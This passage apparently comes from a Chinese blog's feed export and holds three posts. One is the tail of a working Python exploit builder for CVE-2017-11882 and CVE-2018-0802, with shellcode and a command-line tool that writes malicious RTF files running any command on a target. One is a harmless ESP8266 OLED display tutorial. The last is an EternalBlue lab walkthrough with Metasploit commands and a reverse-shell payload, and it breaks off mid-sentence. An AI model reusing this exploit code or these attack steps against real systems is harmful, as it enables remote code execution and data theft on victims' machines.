class="string">30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000030004</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">000000000000000000000000000000000000001c00000002009ec4a900000000000000c8a75c00c4</span></span><br><span class="line"><span class="string">ee5b0000000000030101030a0a01085a5a33c099b202c1e2082be2e8ffffffffc35b50648b40308b</span></span><br><span class="line"><span class="string">400899b203c1e21066ba120c03c28d5b1c53ffe02020202000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000004500710075</span></span><br><span class="line"><span class="string">006100740069006f006e0020004e0061007400690076006500000000000000000000000000000000</span></span><br><span class="line"><span class="string">0000000000000000000000000000000000000020000200ffffffffffffffffffffffff0000000000</span></span><br><span class="line"><span class="string">0000000000000000000000000000000000000000000000000000000000000004000000c500000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000ffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffff00000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">000000000000000000000000000000000000000000000000000000000000000000000000000000ff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000ffffffffffffffffffffffff000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000001050000050000000d0000004d</span></span><br><span class="line"><span class="string">45544146494c4550494354003421000035feffff9201000008003421cb010000010009000003c500</span></span><br><span class="line"><span class="string">000002001c00000000000500000009020000000005000000020101000000050000000102ffffff00</span></span><br><span class="line"><span class="string">050000002e0118000000050000000b0200000000050000000c02a001201e1200000026060f001a00</span></span><br><span class="line"><span class="string">ffffffff000010000000c0ffffffc6ffffffe01d0000660100000b00000026060f000c004d617468</span></span><br><span class="line"><span class="string">54797065000020001c000000fb0280fe0000000000009001000000000402001054696d6573204e65</span></span><br><span class="line"><span class="string">7720526f6d616e00feffffff6b2c0a0700000a0000000000040000002d0100000c000000320a6001</span></span><br><span class="line"><span class="string">90160a000000313131313131313131310c000000320a6001100f0a00000031313131313131313131</span></span><br><span class="line"><span class="string">0c000000320a600190070a000000313131313131313131310c000000320a600110000a0000003131</span></span><br><span class="line"><span class="string">31313131313131310a00000026060f000a00ffffffff0100000000001c000000fb02100007000000</span></span><br><span class="line"><span class="string">0000bc02000000000102022253797374656d000048008a0100000a000600000048008a01ffffffff</span></span><br><span class="line"><span class="string">7cef1800040000002d01010004000000f0010000030000000000</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">stage1=<span class="string">"\xB8\x44\xEB\x71\x12\xBA\x78\x56\x34\x12\x31\xD0\x8B\x08\x8B\x09\x8B\x09\x66\x83\xC1\x3C\x31\xDB\x53\x51\xBE\x64\x3E\x72\x12\x31\xD6\xFF\x16\x53\x66\x83\xEE\x4C\xFF\x10"</span></span><br><span class="line">stage1=stage1.ljust(<span class="number">44</span>,<span class="string">'\x90'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">COMMAND_OFFSET = (<span class="number">0x949</span>+<span class="number">0x2b</span>)*<span class="number">2</span></span><br><span class="line">COMD_LEN = (<span class="number">0x94</span>-<span class="number">0x2b</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_ole_exec_primitive</span>(<span class="params">command</span>):</span><br><span class="line">    hex_command = command.encode(<span class="string">"hex"</span>)</span><br><span class="line">    hex_command += (COMD_LEN - <span class="built_in">len</span>(command)) * <span class="string">"20"</span></span><br><span class="line">    hex_command += <span class="string">"2500"</span></span><br><span class="line">    objdata_hex_stream = OBJDATA_TEMPLATE.translate(<span class="literal">None</span>, <span class="string">"\r\n"</span>)</span><br><span class="line">    ole_data = objdata_hex_stream[:COMMAND_OFFSET] + hex_command + objdata_hex_stream[COMMAND_OFFSET + <span class="built_in">len</span>(hex_command):]</span><br><span class="line">    <span class="keyword">return</span> OBJECT_HEADER + ole_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_rtf</span>(<span class="params">header, trailer, command</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(command) &gt; COMD_LEN:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">'[!] Command must be shorter than 109 bytes!'</span></span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    ole = create_ole_exec_primitive(command + <span class="string">" #"</span>)</span><br><span class="line">    payload=<span class="string">'\x1c\x00\x00\x00\x02\x00\x9e\xc4\xa9\x00\x00\x00\x00\x00\x00\x00\xc8\xa7\\\x00\xc4\xee[\x00\x00\x00\x00\x00\x03\x01\x01\x03\n\n\x01\x08ZZ'</span></span><br><span class="line">    payload+=stage1</span><br><span class="line">    payload+=pack(<span class="string">'&lt;I'</span>,<span class="number">0x00402114</span>) <span class="comment"># ret</span></span><br><span class="line">    payload+=<span class="string">'\x00'</span>*<span class="number">2</span></span><br><span class="line">    payload+=command</span><br><span class="line">    payload=payload.ljust(<span class="number">197</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    <span class="keyword">return</span> header + ole + OBJECT_TRAILER + OBJCLASS11882 + payload.encode(<span class="string">'hex'</span>) + OBJECT_TRAILER11882  + trailer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrheader</span>(<span class="params">file</span>):</span><br><span class="line">    input_file = <span class="built_in">open</span>(file,<span class="string">"r"</span>).read()</span><br><span class="line">    r_header = input_file.split(<span class="string">"{\*\datastore"</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> r_header</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">print</span> LOGO</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">"PoC for CVE-2018-0802 And CVE-2017-11882"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-c"</span>, <span class="string">"--command"</span>, <span class="built_in">help</span>=<span class="string">"Command run in target system"</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-o'</span>, <span class="string">"--output"</span>, <span class="built_in">help</span>=<span class="string">"Output exploit rtf"</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-i"</span>, <span class="string">"--input"</span>, <span class="built_in">help</span>=<span class="string">"Input normal rtf."</span>, required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.<span class="built_in">input</span> != <span class="literal">None</span>:</span><br><span class="line">        r_header = getrheader(args.<span class="built_in">input</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r_header = RTF_HEADER</span><br><span class="line"></span><br><span class="line">    rtf_content = create_rtf(r_header, RTF_TRAILER,  args.command)</span><br><span class="line"></span><br><span class="line">    output_file = <span class="built_in">open</span>(args.output, <span class="string">"w"</span>)</span><br><span class="line">    output_file.write(rtf_content)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">"[*] Done ! output file --&gt; "</span> + args.output </span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用vscode快速搭建单片机开发环境</title>
      <link href="/posts/23513/"/>
      <url>/posts/23513/</url>
      
        <content type="html"><![CDATA[<blockquote><p>摘要：本文主要介绍了如何搭建以Visual Studio Code 和 PlatformIO为基础的单片机开发环境，并以esp8266开发板为例，通过在OLED显示屏上显示文字的一个例子介绍如何开发一个单片机程序。</p></blockquote><p>本文主要使用的环境：</p><blockquote><p>单片机开发板:Esp8266(CH340G)</p><p>Visual Studio Code：1.45.1</p><p>PlatformIO：Core  4.3.4   Home  3.2.2</p><p>U8g2：2.28.6</p></blockquote><h4 id="一、硬件部分"><a href="#一、硬件部分" class="headerlink" title="一、硬件部分"></a>一、硬件部分</h4><p>首先就是去某宝买一个esp8266开发板和显示屏，这里我买的是这个（不贴链接，不然有打广告嫌疑，自己去搜哈，有些卖家不送杜邦线的，可以提前问问）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/23513/10007.png" alt="image-20200609001347090"></p><p>按照卖家的说明将显示屏和开发板连接好</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/23513/100002354.png" alt="image-20200609001656314"></p><h4 id="二、软件部分"><a href="#二、软件部分" class="headerlink" title="二、软件部分"></a>二、软件部分</h4><h5 id="1-安装Visual-Studio-Code-和-PlatformIO"><a href="#1-安装Visual-Studio-Code-和-PlatformIO" class="headerlink" title="1. 安装Visual Studio Code 和 PlatformIO"></a>1. 安装Visual Studio Code 和 PlatformIO</h5><p>vscode: <a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p><p>安装完成vscode启动，扩展页面下搜索platformio即可找到,选择第一个Platformio IDE，安装即可（这里需要耐心等待一会）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/23513/4363463.png" alt="image-20200609004134896"></p><p>安装完成，等待vscode重新加载后，左下角会多一个小房子图标，点击后即可显示Platformio IDE主界面</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/23513/4363463456t.png" alt="image-20200608225407247"></p><h5 id="2-安装显示库"><a href="#2-安装显示库" class="headerlink" title="2.安装显示库"></a>2.安装显示库</h5><p>如图点击主界面右侧侧边栏Libraies选项卡，然后直接搜索U8G2然后点击进去，里面有个安装按钮，点一下即可：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/23513/54y7457.png" alt="image-20200608230257339"></p><h5 id="3-开始我们的第一个程序"><a href="#3-开始我们的第一个程序" class="headerlink" title="3. 开始我们的第一个程序"></a>3. 开始我们的第一个程序</h5><p>   选择新建工程:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/23513/5475476574767.png" alt="image-20200608225916996"></p><p>​    </p><pre><code>选择板子类型和框架然后点完成，这里我的设置如下图：</code></pre><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/23513/135424.png" alt="image-20200608225858345"></p><pre><code>然后即可在main.cpp编辑你的代码：</code></pre><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/23513/1537453.png" alt="image-20200608230108817"></p><p>这里我们输入如下代码</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Arduino.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;U8g2lib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bmp_x 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bmp_y 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SSD1306_SDA 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SSD1306_SLK 4</span></span><br><span class="line"><span class="function">U8G2_SSD1306_128X64_NONAME_F_SW_I2C <span class="title">u8g2</span><span class="params">(U8G2_R0, SSD1306_SLK, SSD1306_SDA)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span> </span>{</span><br><span class="line">  u8g<span class="number">2.</span><span class="built_in">begin</span>();</span><br><span class="line">  u8g<span class="number">2.</span><span class="built_in">enableUTF8Print</span>();<span class="comment">// 打开utf-8支持</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">()</span> </span>{</span><br><span class="line"> u8g<span class="number">2.</span><span class="built_in">setFont</span>(u8g2_font_wqy12_t_gb2312);  <span class="comment">// 设置字体</span></span><br><span class="line">  </span><br><span class="line">  u8g<span class="number">2.</span><span class="built_in">setFontDirection</span>(<span class="number">0</span>);</span><br><span class="line">  u8g<span class="number">2.f</span>irstPage();</span><br><span class="line">  <span class="keyword">do</span> {</span><br><span class="line">    u8g<span class="number">2.</span><span class="built_in">setCursor</span>(<span class="number">0</span>, <span class="number">15</span>);</span><br><span class="line">    u8g<span class="number">2.</span><span class="built_in">print</span>(<span class="string">"中国"</span>);</span><br><span class="line">    u8g<span class="number">2.</span><span class="built_in">drawUTF8</span>(<span class="number">0</span>,<span class="number">40</span>,<span class="string">"我爱你"</span>);</span><br><span class="line">    </span><br><span class="line">  } <span class="keyword">while</span> ( u8g<span class="number">2.</span><span class="built_in">nextPage</span>() );</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>代码解释：</p><p>(1).void setup() 函数里的内容启动时会执行一次以后不再执行，一般用于初始化。void loop()函数里的内容将会在机器通电时循环执行，一般用于干正事。</p><p>(2).u8g2.begin()：U8g2的构造函数。可以理解为初始化。</p><p>(3).5、6、7行与你的显示屏有关</p><blockquote><p>具体参见：</p><p><a href="https://blog.csdn.net/weixin_30510153/article/details/96227475">https://blog.csdn.net/weixin_30510153/article/details/96227475</a><br><a href="https://github.com/olikraus/u8g2/wiki/gallery">https://github.com/olikraus/u8g2/wiki/gallery</a></p></blockquote><p>(4).u8g2.setFontDirection()，用于设置方向 可选参数:0123</p><p>(5).u8g2.firstPage()/nextPage()：循环刷新显示，保持这样就好，把你要输出的内容放在这里面就行。</p><p>(6).u8g2.setCursor(x, y) 设置打印功能的光标位置，也就是设置你在上绘制图形或文字的起始位置。</p><p>(7).delay(1000)会使单片机延迟1000个时钟周期也就是暂停一段时间啥也不干留给显示屏处理数据，设置太短会来不及写到屏幕上。</p><h5 id="4-连接板子到电脑，然后编译并刷写到板子上"><a href="#4-连接板子到电脑，然后编译并刷写到板子上" class="headerlink" title="4.连接板子到电脑，然后编译并刷写到板子上"></a>4.连接板子到电脑，然后编译并刷写到板子上</h5><p>如下图，可以先点编译再点旁边的上传，也可以直接点上传</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/23513/4535.png" alt="image-20200609000955186"></p><p>当你看到下图时，说明刷写成功了，没成功的仔细检查一下设备连线，还有就是看看你的代码，显示屏设置对不对。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/23513/10254.png" alt="image-20200609001057699"></p><h4 id="三、成果展示"><a href="#三、成果展示" class="headerlink" title="三、成果展示"></a>三、成果展示</h4><p>刷写成功后，OLED显示屏应该可以成功显示出我们设置的内容了</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/23513/45374583783.png" alt="image-20200609002205245"></p><blockquote><p>附其他U8G2库常用函数</p><p>1.指令</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">u8g<span class="number">2.</span><span class="built_in">clearDisplay</span>();    <span class="comment">// 清除显示数据及屏幕</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">clearBuffer</span>();    <span class="comment">// 清Buffer缓冲区的数据</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">sendBuffer</span>();    <span class="comment">// 将Buffer帧缓冲区的内容发送到显示器,发送刷新消息</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">sendF</span>(<span class="string">"c"</span>, <span class="number">0x0a7</span>);    <span class="comment">// 向显示控制器发送特殊命令</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setPowerSave</span>(<span class="number">0</span>)    <span class="comment">// 开关省电模式</span></span><br></pre></td></tr></tbody></table></figure><p>2.设置</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">u8g<span class="number">2.</span><span class="built_in">enableUTF8Print</span>();    <span class="comment">//设置启用UTF-8支持</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">disableUTF8Print</span>();    <span class="comment">//设置停用UTF-8支持</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setContrast</span>();    <span class="comment">//设置显示屏亮度/对比度(0-255)</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setBusClock</span>();    <span class="comment">//设置连接速度(IIC:200000-400000/SPI:1000000-8000000),在begin()之前调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置字体</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setFontMode</span>(<span class="number">0</span>);    <span class="comment">//定义字体背景模式,仅u8g2_xxx_tX字体支持,默认0,禁用透明</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setFontDirection</span>(<span class="number">0</span>); <span class="comment">//旋转当前显示 参数:0123</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setFont</span>(u8g2_font_unifont_t_chinese1);    <span class="comment">//设置字体</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setFontPosCenter</span>();    <span class="comment">//设置字体基线Center/Baseline/Bottom/Top</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置颜色</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setDrawColor</span>(<span class="number">1</span>); <span class="comment">//设置颜色,0透显,1实显,2XOR (drawCircle,drawDisc,drawEllipse和drawFilledEllipse不支持XOR模式)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置光标位置</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">home</span>();    <span class="comment">//设置光标回初始位置</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setCursor</span>(x, y); <span class="comment">//设置打印功能的光标位置</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">setBitmapMode</span>(<span class="number">0</span>);    <span class="comment">//设置是否开启位图函数背景色</span></span><br></pre></td></tr></tbody></table></figure><p>3.简单绘制</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">u8g<span class="number">2.</span><span class="built_in">drawStr</span>(x, y, <span class="string">"文本"</span>); <span class="comment">// 绘制文本字符,不能绘制编码大于或等于256,绘制文本前需定义字体.y轴向上绘制</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawUTF8</span>(x, y,<span class="string">"字符"</span>);    <span class="comment">// 绘制一个编码为UTF-8的字符串.注意1.编译器支持2.代码编辑器支持</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawGlyph</span>(x, y, HEX);    <span class="comment">// 绘制特殊文本图标(需联合特殊字体)</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">print</span>();    <span class="comment">// 打印文本字符(需要联合光标位置setCursor,setFont)支持变量和F()</span></span><br></pre></td></tr></tbody></table></figure><p>4.高级绘制</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">u8g<span class="number">2.</span><span class="built_in">drawPixel</span>(x, y); <span class="comment">// 在xy位置绘制一个像素.</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawHLine</span>(x, y, w); <span class="comment">// 绘制水平线 w长度</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawVLine</span>(x, y, h);    <span class="comment">// 绘制垂直线 h高度</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawLine</span>(x1, y1, x2, y2);    <span class="comment">// 画自由线 x1y1点1 x2y2点2</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawBox</span>(x, y, w, h); <span class="comment">// 绘制矩形，画填充矩形w,h,宽度,高度 2 u8g2.drawFrame(x, y, w, h); // 画空心矩形w,h,宽度,高度</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawRFrame</span>(x,y,w,h,r); <span class="comment">//绘制圆角矩形，要求w &gt;= 2*(r+1);h &gt;= 2*(r+1);否则未定义2*(r+1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正或椭圆</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawCircle</span>(圆心x, 圆心y, 半径rad, 部分位置U8G2_DRAW_ALL);    <span class="comment">// 画空心圆 rad半径 直径为 2rad+1</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawEllipse</span>(圆心x, 圆心y, 椭圆长度x, 椭圆宽度y, 部分位置U8G2_DRAW_ALL)    <span class="comment">//画空心椭圆 长度和宽度均为整个圆的1/2</span></span><br><span class="line">U8G2_DRAW_ALL    <span class="comment">/*替换参数:</span></span><br><span class="line"><span class="comment">U8G2_DRAW_ALL 全部</span></span><br><span class="line"><span class="comment">U8G2_DRAW_UPPER_RIGHT 上右</span></span><br><span class="line"><span class="comment">U8G2_DRAW_UPPER_LEFT 上左</span></span><br><span class="line"><span class="comment">U8G2_DRAW_LOWER_RIGHT 下右</span></span><br><span class="line"><span class="comment">U8G2_DRAW_LOWER_LEFT 下左*/</span></span><br><span class="line"></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawTriangle</span>(x1,y1,x2,y2,x3,y3); <span class="comment">//绘制多边形，三个点的坐标,实心</span></span><br><span class="line">u8g<span class="number">2.</span><span class="built_in">drawXBM</span>( x, y, w, h, bits);    <span class="comment">//绘制位图，bits是位图资源表,setBitmapMode(1)切换为旧模式</span></span><br></pre></td></tr></tbody></table></figure></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Cpp </tag>
            
            <tag> esp8266 </tag>
            
            <tag> 单片机 </tag>
            
            <tag> Vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝漏洞的简单利用</title>
      <link href="/posts/29143/"/>
      <url>/posts/29143/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：</p><p>永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p><p>详见<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010">Microsoft 安全公告：MS17-010</a> :<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010</a></p><p>恶意代码会扫描开放445文件共享端口的Windows机器，<strong>无需用户任何操作，只要开机上网</strong>，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p><p>本文主要利用“永恒之蓝”漏洞（<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010">Microsoft 安全公告：MS17-010</a>）对目标靶机进行攻击并拿到远程执行的权限，并通过获取远程靶机上的文件的例子讲解此漏洞的危害，提高大家的安全意识。</p><p><strong>本文为科普性质文章，仅用于学习交流，严禁用于非法用途</strong></p></blockquote><p>实验环境：</p><p>靶机： Windows 7 64 位 专业版 ip:192.168.4.6</p><p>攻击主机： Kali X64 2020.2  ip:192.168.4.3</p><h5 id="1-设置靶机"><a href="#1-设置靶机" class="headerlink" title="1.设置靶机"></a>1.设置靶机</h5><p>我们在靶机的C盘上放置一个文本文件，保存此文件，内容如下：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/29143/image-20200622204008081.png" alt="win7靶机上存放的文件内容"></p><h5 id="2-开始攻击"><a href="#2-开始攻击" class="headerlink" title="2.开始攻击"></a>2.开始攻击</h5><p>（不想了解攻击过程的可以直接看 3 ）首先扫描一下本网内的有哪些机器可以攻击</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -sV -Pn 192.168.4.0/24</span><br></pre></td></tr></tbody></table></figure><p>如下图可以发现我们成功扫描到了我们的靶机：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/29143/image-20200622204154770.png" alt="扫描结果"></p><p>然后终端打开 msfconsole攻击框架</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/29143/image-20200621213913982.png" alt="启动sfconsole攻击框架"></p><p>设置参数：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.4.3</span><br><span class="line">set rhost 192.168.4.6</span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure><p>下图为渗透成功后的界面：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/29143/75867836.png" alt="执行渗透命令"></p><h5 id="3-入侵"><a href="#3-入侵" class="headerlink" title="3.入侵"></a>3.入侵</h5><p>这时候我们已经可以在Win7靶机上执行任意命令了，为了简单起见，这里我们执行一个type命令查看一下刚刚上文保存的的文件，可以看到文件内容已经可以获取，而且在靶机上没有任何提示：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/29143/4536783.png" alt="远程执行命令查看文件"></p><h5 id="4-结语"><a href="#4-结语" class="headerlink" title="4.结语"></a>4.结语</h5><p>通过“永恒之蓝”漏洞，黑客便可远程攻击拥有任何此漏洞的Windows 机器，<strong>无需用户任何操作，只要开机上网（因此不要连接来历不明的WiFi，也许你就刚好暴露在黑客的枪口下）</strong>，不法分子就能在电脑和服务器中<strong>植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</strong></p><p>由此可见，任何没有打补丁的机器都将可能陷入危险之中，所以请不要随意关闭Windows 